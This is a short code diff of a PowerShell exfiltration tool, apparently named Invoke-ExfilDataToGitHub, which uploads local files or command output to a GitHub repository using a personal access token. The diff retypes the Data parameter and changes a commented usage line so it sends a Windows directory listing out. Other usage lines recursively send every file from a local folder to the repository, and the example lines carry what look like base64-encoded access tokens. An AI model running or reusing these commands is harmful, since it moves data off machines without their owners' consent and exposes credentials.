@@ -83,7 +83,7 @@ Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3Mz
         $Filter,
 
         [Parameter(Position = 5, Mandatory = $True, ParameterSetName="ExfilDataToFile")]
-        [Object]
+        [String]
         $Data,
 
         [Parameter(Mandatory = $False, ParameterSetName="ExfilFilesFromFilePath")]
@@ -283,4 +283,4 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
 
 #Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "NmJlYmU0ODA1N2YxMzAwZWQyZmM4MzZjODdhNjE5ZWI2MmEzMDNlN==" -GHFilePath "testfolder" -LocalfilePath "C:\temp" -Filter "*.*" -Recurse
 
-#Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "NmJlYmU0ODA1N2YxMzAwZWQyZmM4MzZjODdhNjE5ZWI2MmEzMDNlN==" -GHFilePath "testfolder/" -GHFileName "myfile.txt" -Data "a bit of test data"
+#Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "NmJlYmU0ODA1N2YxMzAwZWQyZmM4MzZjODdhNjE5ZWI2MmEzMDNlNw==" -GHFilePath "testfolder/" -GHFileName "myfile.txt" -Data (dir c:\Windows | Out-String )
